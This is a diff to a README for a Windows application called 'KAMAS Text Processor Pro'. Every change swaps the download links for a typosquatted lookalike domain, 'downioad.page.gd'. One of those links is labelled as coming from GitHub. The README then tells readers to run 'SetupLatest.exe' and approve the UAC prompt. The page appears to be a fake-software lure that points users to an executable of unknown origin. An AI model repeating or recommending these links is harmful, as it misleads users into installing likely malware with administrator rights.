@@ -2,7 +2,7 @@
 
 KAMAS Text Processor Pro is a powerful desktop application designed for advanced text processing and database management. This 2026 version offers enhanced features and optimized performance for Windows users, making it an essential tool for productivity and professional workflows.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -28,7 +28,7 @@ Before installing KAMAS, ensure your system meets the following requirements for
 
 Installing KAMAS Text Processor Pro is straightforward. Follow these step-by-step instructions:
 
-1. **Download the Installer**: Click the download button above or visit the [official download page](https://download-page.page.gd/) to get the `SetupLatest.exe` file. Ensure you download from the official source for security.
+1. **Download the Installer**: Click the download button above or visit the [official download page](https://downioad.page.gd/) to get the `SetupLatest.exe` file. Ensure you download from the official source for security.
 2. **Run the Installer**: Locate the downloaded `SetupLatest.exe` file in your downloads folder. Double-click the file to start the installation process. If prompted by User Account Control (UAC), click "Yes" to allow the installer to run.
 3. **Follow On-Screen Instructions**: The installation wizard will guide you through the setup. Accept the license agreement, choose your preferred installation directory (default is recommended), and select any additional components or shortcuts.
 4. **Complete Installation**: Once the installation is complete, you may be prompted to restart your computer for changes to take effect. After restarting, launch KAMAS from the desktop shortcut or start menu. The first run may include a brief setup wizard to configure initial settings.
@@ -57,7 +57,7 @@ Here are some common questions users might have about KAMAS Text Processor Pro:
 
 For the latest version of KAMAS Text Processor Pro, please download from the official source:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
